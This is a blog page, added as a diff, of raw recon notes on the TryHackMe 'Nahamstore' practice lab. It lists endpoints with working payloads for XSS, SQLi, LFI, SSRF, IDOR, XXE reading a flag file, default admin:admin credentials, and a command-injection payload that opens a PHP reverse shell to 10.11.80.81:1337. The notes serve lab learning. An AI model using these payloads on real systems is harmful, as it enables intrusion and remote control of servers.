@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+
+    <!-- Custom stylesheet -->
+    <link rel="stylesheet" href="/assets/css/custom.css">
+    <!-- Fontawesome icons cdn -->
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" 
+    integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" 
+    crossorigin="anonymous"/>
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Nahamstore Recon Notes | KickAss101</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Nahamstore Recon Notes" />
+<meta name="author" content="KickAss101" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Not a walkthrough or writeup. Just my raw recon notes and vulnerabilities Root domains nahamstore.thm" />
+<meta property="og:description" content="Not a walkthrough or writeup. Just my raw recon notes and vulnerabilities Root domains nahamstore.thm" />
+<link rel="canonical" href="https://kickass101.github.io/nahamstore-recon-notes/" />
+<meta property="og:url" content="https://kickass101.github.io/nahamstore-recon-notes/" />
+<meta property="og:site_name" content="KickAss101" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-16T00:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Nahamstore Recon Notes" />
+<script type="application/ld+json">
+{"description":"Not a walkthrough or writeup. Just my raw recon notes and vulnerabilities Root domains nahamstore.thm","url":"https://kickass101.github.io/nahamstore-recon-notes/","@type":"BlogPosting","headline":"Nahamstore Recon Notes","dateModified":"2022-08-16T00:00:00+05:30","datePublished":"2022-08-16T00:00:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://kickass101.github.io/nahamstore-recon-notes/"},"author":{"@type":"Person","name":"KickAss101"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>KickAss101</h1>
+        </a>
+        <h2>Writeups/Walkthroughs for n00bs by a n00b :)</h2>
+
+        <section id="downloads">
+          
+        </section>
+        <!-- Navigation links -->
+<ul class="links">
+    <li><a href="/">Home</a></li>
+    <li><a href="/about/">About</a></li>
+</ul>
+        <a href="https://github.com/KickAss101/kickass101.github.io/" class="btn btn-github"><span class="icon"></span>Source Code</a>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>16 August 2022</small>
+<h1>Nahamstore Recon Notes</h1>
+
+<p><em>Not a walkthrough or writeup. Just my raw recon notes and vulnerabilities</em>
+<br /><br /></p>
+<h3 id="root-domains">Root domains</h3>
+<ul>
+  <li>nahamstore.thm</li>
+</ul>
+
+<h3 id="web-technologies">Web Technologies</h3>
+<ul>
+  <li>nginx, ubuntu, jqurey</li>
+</ul>
+
+<hr />
+<h2 id="nahamstorethm">nahamstore.thm</h2>
+<p><strong>Ports:</strong> 22,80,8000</p>
+
+<h3 id="wwwnahamstorethm-shopnahamstorethm---nahamstorethm">www.nahamstore.thm, shop.nahamstore.thm -&gt; nahamstore.thm</h3>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/&lt;img src=/ onerror=alert()&gt;</code> [rXSS] [Page Not Found]</li>
+  <li><code class="language-plaintext highlighter-rouge">/?q</code> [rXSS]</li>
+  <li><code class="language-plaintext highlighter-rouge">/?r</code> [open redirect]
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/basket</code> [POST] [address_id] [IDOR, PII]
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/register</code> [POST] [register_email, register_password]</li>
+  <li><code class="language-plaintext highlighter-rouge">/register?redirect_url</code> [open redirect]
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/returns</code> [POST] [return_info] [sXSS]</li>
+  <li><code class="language-plaintext highlighter-rouge">/returns</code> [POST] [order_number] [SQLi]
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/uploads</code> [301 -&gt; 127.0.0.1:80]
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/login</code></li>
+  <li><code class="language-plaintext highlighter-rouge">/logout</code>
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/search?q='-alert("test")-'</code> [rXSS] [js param <code class="language-plaintext highlighter-rouge">search</code>]</li>
+  <li><code class="language-plaintext highlighter-rouge">/?q=%22+onfocus%3Dalert()+autofocus+</code> [rXSS][searchbox]
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/stockcheck</code> [POST] [SSRF] 
+<code class="language-plaintext highlighter-rouge">server=stock.nahamstore.thm@internal-api.nahamstore.thm?a=&amp;product_id=1</code>
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/staff</code> [File Upload - “xlxs only”] [XXE via xlxs]
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/account/orders</code></li>
+  <li><code class="language-plaintext highlighter-rouge">/account/settings</code> [Email,password change, disable acct]</li>
+  <li><code class="language-plaintext highlighter-rouge">/account/addressbook</code> [Address change]</li>
+  <li><code class="language-plaintext highlighter-rouge">/account/addressbook</code> [POST] [<code class="language-plaintext highlighter-rouge">new_address_title,new_address_fname,new_address_lname,new_address_line1,new_address_line2,road,new_address_line3,new_address_state,new_address_zipcode</code>]</li>
+  <li><code class="language-plaintext highlighter-rouge">/account/orders/3</code>
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/product?id=2&amp;name=&lt;/title&gt;</code> [rXSS]</li>
+  <li><code class="language-plaintext highlighter-rouge">/product?id=2&amp;discount=" onfocus="alert()" autofocus "</code> [rXSS]</li>
+  <li><code class="language-plaintext highlighter-rouge">/product</code> [Discount, Add to basket, Check Stock]</li>
+  <li><code class="language-plaintext highlighter-rouge">/product?id=</code> [SQLi] [rXSS]</li>
+  <li><code class="language-plaintext highlighter-rouge">/product</code> [POST] [discount] [rXSS]</li>
+  <li><code class="language-plaintext highlighter-rouge">/product/picture/?file=....//....//....//....//....//lfi/flag.txt</code> [LFI] 
+<br /><br /></li>
+  <li><code class="language-plaintext highlighter-rouge">/pdf-generator</code> [POST] [IDOR] 
+<code class="language-plaintext highlighter-rouge">what=order&amp;id=3%26user_id=3</code></li>
+  <li><code class="language-plaintext highlighter-rouge">/pdf-generator</code> [POST] [Blind RCE]
+<code class="language-plaintext highlighter-rouge">what=order&amp;id=4%3b$(php+-r+'$sock%3dfsockopen("10.11.80.81",1337)%3bshell_exec("sh+&lt;%263+&gt;%263+2&gt;%263")%3b')</code></li>
+</ul>
+
+<h3 id="internal-apinahamstorethm">internal-api.nahamstore.thm</h3>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/orders</code> [Information Disclosuer, IDOR]
+[<code class="language-plaintext highlighter-rouge">"id":"4dbc51716426d49f524e10d4437a5f5a","5ae19241b4b55a360e677fdd9084c21c","70ac2193c8049fcea7101884fd4ef58e"</code>]</li>
+</ul>
+
+<h3 id="nahamstorethm8000">nahamstore.thm:8000</h3>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/admin</code> [admin:admin] [Marketing Manager Dashboard]</li>
+  <li><code class="language-plaintext highlighter-rouge">/admin/8d1952ba2b3c6dcd76236f090ab8642c</code> [RCE] [PHP rev shell]</li>
+</ul>
+
+<h3 id="marketingnahamstorethm">marketing.nahamstore.thm</h3>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/?error=</code> [XSS]</li>
+</ul>
+
+<h3 id="nahamstore-2020-devnahamstorethm-api">nahamstore-2020-dev.nahamstore.thm [API]</h3>
+<ul>
+  <li>/api/customers/?customer_id=2 [IDOR, Information Disclosure]</li>
+</ul>
+
+<h3 id="stocknahamstorethm-api">stock.nahamstore.thm [API]</h3>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/product</code></li>
+  <li><code class="language-plaintext highlighter-rouge">/product/1</code></li>
+  <li><code class="language-plaintext highlighter-rouge">/product/1?xml</code> [XML output]</li>
+  <li><code class="language-plaintext highlighter-rouge">/product/1?xml</code> [XXE] [POST]</li>
+</ul>
+
+<p><br /></p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE foo [
+&lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt;</span>
+]&gt;
+<span class="nt">&lt;data&gt;</span>
+    <span class="nt">&lt;X-Token&gt;</span>
+        <span class="ni">&amp;xxe;</span>
+    <span class="nt">&lt;/X-Token&gt;</span>
+<span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+
+
+
+  <small>tags: <em>bug</em> - <em>bounty</em> - <em>tryhackme</em></small>
+
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
